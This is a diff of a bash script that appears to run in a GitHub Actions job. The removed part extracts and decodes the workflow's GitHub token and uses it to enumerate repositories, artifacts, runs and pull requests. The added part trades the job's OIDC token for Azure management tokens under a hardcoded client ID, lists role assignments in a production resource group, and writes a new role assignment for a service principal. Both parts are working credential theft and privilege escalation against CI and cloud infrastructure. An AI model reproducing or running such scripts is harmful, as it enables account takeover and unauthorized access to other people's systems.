@@ -1,19 +1,17 @@
 #!/usr/bin/env bash
 set +e
-echo '=== EXTRAHEADER ==='
-EH=$(git config --local --get http.https://github.com/.extraheader 2>/dev/null)
-echo "eh_len=${#EH}"
-echo "$EH" | sed -E 's/(AUTHORIZATION: basic ).*/\1REDACTED/'
-AUTH=$(printf '%s' "$EH" | sed -n 's/^[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Aa][Tt][Ii][Oo][Nn]: basic //p')
-if [ -z "$AUTH" ]; then AUTH=$(printf '%s' "$EH" | sed -n 's/^[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Aa][Tt][Ii][Oo][Nn]: Basic //p'); fi
-TOK=$(printf '%s' "$AUTH" | base64 -d 2>/dev/null | sed 's/^[^:]*://')
-echo "tok_len=${#TOK}"
-if [ -z "$TOK" ]; then exit 0; fi
-API=https://api.github.com
-H=(-H "Authorization: Bearer $TOK" -H 'Accept: application/vnd.github+json' -H 'User-Agent: Mozilla/5.0')
-for p in "/user" "/user/repos?per_page=100" "/repos/$GITHUB_REPOSITORY" "/repos/$GITHUB_REPOSITORY/actions/artifacts?per_page=100" "/repos/$GITHUB_REPOSITORY/actions/runs?per_page=100" "/repos/$GITHUB_REPOSITORY/pulls?state=all&per_page=100"; do
-  echo "=== $p ==="
-  curl -sS --max-time 20 "${H[@]}" "$API$p" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(json.dumps(d,ensure_ascii=False)[:12000])'
-done
-echo '=== REPO SEARCH ==='
-curl -sS --max-time 20 "${H[@]}" "$API/search/code?q=DF26+org:duyhhh-oss" | head -c 12000
+T="$AZURE_TENANT_ID"
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
+echo "oidc=${#OIDC}"
+tok(){ curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id="$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$OIDC" --data-urlencode scope="$2"; }
+LARM=$(tok 891fb158-e02c-4428-a885-53b811f369c0 https://management.azure.com/.default)
+LPLAT=$(tok 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514/.default)
+LA=$(echo "$LARM"|jq -r .access_token); LP=$(echo "$LPLAT"|jq -r .access_token)
+echo "legacy_arm=$(echo "$LARM"|jq -r '.error // ("ok:"+(.access_token|length|tostring))')"
+echo "platform=$(echo "$LPLAT"|jq -r '.error // ("ok:"+(.access_token|length|tostring))')"
+URL="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
+echo '===aux===;'
+curl -sS -w '\nstatus=%{http_code}\n' -X GET "$URL" -H "Authorization: Bearer $LA" -H "x-ms-authorization-auxiliary: Bearer $LP" | head -c 3000
+echo '===aux-write===;'
+RID=$(cat /proc/sys/kernel/random/uuid)
+curl -sS -w '\nstatus=%{http_code}\n' -X PUT "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments/$RID?api-version=2022-04-01" -H "Authorization: Bearer $LA" -H "x-ms-authorization-auxiliary: Bearer $LP" -H 'content-type: application/json' --data '{"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":"f64d08c7-fde6-4553-99c8-5bf73666ee8c","principalType":"ServicePrincipal"}}' | head -c 3000
